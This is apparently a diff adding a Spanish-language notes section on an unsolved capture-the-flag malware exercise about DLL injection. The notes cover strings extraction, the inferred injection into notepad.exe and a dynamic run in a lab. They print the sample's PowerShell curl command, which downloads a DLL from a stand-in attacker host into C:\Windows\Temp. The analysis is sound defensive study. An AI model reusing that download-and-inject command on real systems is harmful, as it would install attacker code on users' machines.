@@ -123,6 +123,133 @@ Flag format: `flag_answer1_answer2_answer3_answer4`
 
 ---
 
+### Ejercicio en progreso — Malware: "DLL Injection"
+
+**NO resuelto aún** — análisis activo, sin flag.
+
+**Metadata:**
+- Categoría: Malware / Dificultad: (no especificada)
+- TTP: Encrypted/Encoded File, Hide Artifacts
+- Entorno: Windows
+
+**Infraestructura:**
+- Workstation Windows: 192.168.200.50
+- File server: 192.168.200.200:80
+
+**Artefacto:** `http://192.168.200.200/DLL Injection.zip` →
+- `DLL Injection.exe`
+- `pass.txt` (contiene una línea: `password : infect`)
+
+**Las 2 preguntas del flag:**
+1. ¿Cuál es el proceso target del DLL Injection? (ejemplo: `a.exe`)
+2. ¿Desde qué URL se descarga el DLL inyectado? (ejemplo: `http://example.com:80`)
+
+Flag format: `flag_targetprocess_URLpath`
+
+---
+
+### Hallazgos del análisis (estado al corte)
+
+**Análisis estático — PowerShell strings extraction:**
+
+```powershell
+$bytes = [System.IO.File]::ReadAllBytes("C:\Users\user\Downloads\DLL Injection.exe")
+$ascii = [System.Text.Encoding]::ASCII.GetString($bytes)
+($ascii -split '\0') | Where-Object { $_.Length -gt 5 } | Select-String -Pattern "http|\.exe|\.dll"
+```
+
+Output relevante (primer filtro):
+```
+c:/windows/temp/msg.dll
+powershell.exe -Command curl -o C:\Windows\Temp\msg.dll http://attack.example.com:8080/static/msg.dll
+notepad.exe
+KERNEL32.dll
+msvcrt.dll
+USER32.dll
+```
+
+**Substring alrededor de "curl" (contexto concatenado):**
+```
+...msg.dll powershell.exe -Command curl -o C:\Windows\Temp\msg.dll
+http://attack.example.com:8080/static/msg.dllKernel32LoadLibraryAnotepad.exe
+DLL Injection[-] cannot open process[-] cannot findPidByName...
+```
+
+**Lógica del malware (inferida):**
+1. Ejecuta `powershell.exe -Command curl` para descargar `msg.dll` desde `http://attack.example.com:8080/static/msg.dll` → lo guarda en `C:\Windows\Temp\`
+2. Carga `Kernel32.dll` → llama a `LoadLibraryA`
+3. Busca `notepad.exe` por PID (`findPidByName`) → inyecta el DLL
+
+**Análisis dinámico — ejecución con argumento:**
+
+```powershell
+& ".\DLL Injection.exe" infect
+```
+
+Output: el exe SÍ ejecuta el curl pero falla con:
+```
+curl : The remote name could not be resolved: 'attack.example.com'
+```
+
+→ El dominio `attack.example.com` no resuelve en la red del lab.
+→ No aparece `msg.dll` en `C:\Windows\Temp\`
+→ No hay actividad en Resource Monitor → Network
+
+**Hosts file — sin entradas custom:**
+```powershell
+Get-Content "C:\Windows\System32\drivers\etc\hosts"
+```
+Solo entradas por defecto (localhost). Sin mapeo para `attack.example.com`.
+
+---
+
+### Flags intentados (todos rechazados)
+
+| Flag intentado | Resultado |
+|----------------|-----------|
+| `flag_notepad.exe_http://attack.example.com:8080/static/msg.dll` | Incorrecto |
+| `flag_notepad.exe_http://attack.example.com:8080` | Incorrecto |
+
+---
+
+### Próximos pasos para resolver el ejercicio
+
+**Prioridad alta — sin explorar:**
+
+1. **Buscar IP hardcodeada en el exe** — el dominio podría ser decorativo y la IP real estar separada:
+   ```powershell
+   ($ascii -split '\0') | Where-Object { $_ -match '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' }
+   ```
+
+2. **Verificar si la DLL existe en el file server del lab** — el ejercicio es self-contained:
+   ```
+   http://192.168.200.200/static/msg.dll
+   http://192.168.200.200:8080/static/msg.dll
+   http://192.168.200.200/msg.dll
+   ```
+   Si alguna descarga el archivo, esa es la URL real del flag.
+
+3. **Dump completo de strings sin filtro** — puede haber strings omitidas:
+   ```powershell
+   ($ascii -split '\0') | Where-Object { $_.Length -gt 5 }
+   ```
+
+**Hipótesis de trabajo:**
+- Target process: `notepad.exe` (confirmado por análisis estático y dinámico)
+- URL: probablemente usa la IP del file server (`192.168.200.200`) en lugar del dominio, o el dominio resuelve a esa IP desde otro punto de la red
+- El password "infect" activa la ejecución real del payload (confirmado — el exe sí corre el curl con ese argumento)
+
+---
+
+### Imágenes capturadas (images/malware-dll-injection-XX.png)
+
+- 01: PowerShell strings extraction — output con URL y proceso target
+- 02: Substring alrededor de "curl" — contexto completo concatenado
+- 03: Ejecución dinámica con argumento "infect" — error DNS `attack.example.com`
+- 04: Hosts file — sin entradas custom para `attack.example.com`
+
+---
+
 ### Metodología de writeups establecida
 
 Estructura de cada ejercicio documentado:
